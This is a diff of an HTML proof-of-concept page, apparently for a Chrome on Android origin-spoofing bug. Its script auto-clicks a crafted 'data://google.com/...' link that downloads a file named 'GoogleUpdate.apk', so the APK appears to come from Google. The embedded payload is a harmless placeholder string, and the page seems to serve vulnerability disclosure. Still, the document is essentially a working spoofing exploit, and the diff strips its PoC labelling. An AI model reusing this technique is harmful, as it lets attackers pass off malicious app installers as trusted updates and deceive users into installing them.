@@ -1,48 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Chrome Android Origin Spoof PoC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      margin-top: 60px;
-    }
-    button {
-      font-size: 18px;
-      padding: 14px 28px;
-      border-radius: 8px;
-      border: none;
-      background: #1a73e8;
-      color: white;
-    }
-  </style>
-</head>
+<html>
+<body style="text-align:center;margin-top:60px">
 
-<body>
-  <h2>Download PoC</h2>
-  <p>Tap the button below</p>
+<button onclick="go()" style="font-size:18px;padding:14px 28px">
+  Download
+</button>
 
-  <button onclick="start()">Download</button>
+<script>
+function go() {
+  const a = document.createElement("a");
+  a.href =
+    "data://google.com/application/vnd.android.package-archive;base64," +
+    "VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==" +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+  a.download = "GoogleUpdate.apk";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+</script>
 
-  <script>
-    function start() {
-      const a = document.createElement("a");
-      a.href =
-        "data://google.com/application/vnd.android.package-archive;base64," +
-        "VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==" +
-        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-      a.download = "GoogleUpdate.apk";
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-
-      setTimeout(() => {
-        location.href = "https://www.google.com";
-      }, 3000);
-    }
-  </script>
 </body>
 </html>
